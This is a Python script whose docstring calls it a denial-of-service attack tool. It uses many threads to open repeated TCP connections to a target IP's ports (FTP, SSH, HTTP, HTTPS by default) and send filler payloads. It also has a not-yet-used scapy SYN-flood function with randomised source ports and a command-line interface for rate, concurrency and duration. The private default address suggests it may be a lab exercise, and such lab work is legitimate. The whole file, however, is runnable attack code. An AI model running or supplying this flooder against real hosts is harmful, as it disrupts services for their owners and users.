import socket
import time
import random
import argparse
import threading
import math
import os
from scapy.all import IP, TCP, Raw, send, RandShort

"""
This file is used for a denial of service based attack.
Currently attempts to connnect continuously and sends a small data packet.
"""

class DoS:
    # Initializes target ip, ports, mode, requests per second and concurrency
    def __init__(self, target_ip, ports, requestsPerSecond, concurrency, payload="test"):
        self.target_ip = target_ip
        self.ports = ports
        self.requestsPerSecond = requestsPerSecond
        self.concurrency = concurrency
        self.payload = payload
        self.stop = threading.Event()


    # Attempts to connect
    def connect(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.target_ip, port))
            try:
                if self.payload == "test":
                    payload = b'ABCD' * 512
                    try:
                        s.sendall(payload)
                    except Exception:
                        pass
                elif self.payload == "binary":
                    payload = b'\x00' * 128
                    try:
                        s.sendall(payload[:512])
                    except Exception:
                        pass
                else:
                    try:
                        s.send(b'X')
                    except Exception:
                        pass
            except Exception:
                pass
            s.close()
        except Exception:
            pass

    # Loops until connect
    def connect_loop(self):
        interval = 0.0
        if self.requestsPerSecond > 0:
            interval = 1.0 / self.requestsPerSecond

        while not self.stop.is_set():
            self.connect(random.choice(self.ports))

            if interval:
                time.sleep(interval)

    # test later, not yet used
    def syn_flood(self, port, count):
        ip = IP(dst = self.target_ip)
        tcp = TCP(sport = RandShort(), dport = port, flags = "S")
        raw = Raw(b"X"*1024)
        p = ip / tcp / raw
        send(p, count=count, verbose = 0)


    # Runs the DoS attack
    def run(self, duration):
        print(f"target={self.target_ip} ports={self.ports} requestsPerSecond={self.requestsPerSecond} concurrency={self.concurrency} duration={duration}s")
        threads = []

        for _ in range(self.concurrency):
            t = threading.Thread(target=self.connect_loop, daemon=True)
            threads.append(t)
            t.start()
        end = time.time() + duration

        try:
            while time.time() < end:
                time.sleep(0.2)
        except KeyboardInterrupt:
            pass

        self.stop.set()

        for t in threads:
            t.join(timeout=2.0)
        print("done")


def parse_ports(s):
    return [int(x) for x in s.split(",") if x.strip()]

# main function
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="192.168.1.65")
    ap.add_argument("--ports", default="21,22,80,443")
    ap.add_argument("--requestsPerSecond", type=float, default=10.0)
    ap.add_argument("--concurrency", type=int, default=10)
    ap.add_argument("--duration", type=int, default=15)
    ap.add_argument("--payload", choices=["test","binary"], default="test")
    args = ap.parse_args()
    dos = DoS(args.target, parse_ports(args.ports), args.requestsPerSecond, args.concurrency, args.payload)
    dos.run(args.duration)




if __name__ == "__main__":
    main()
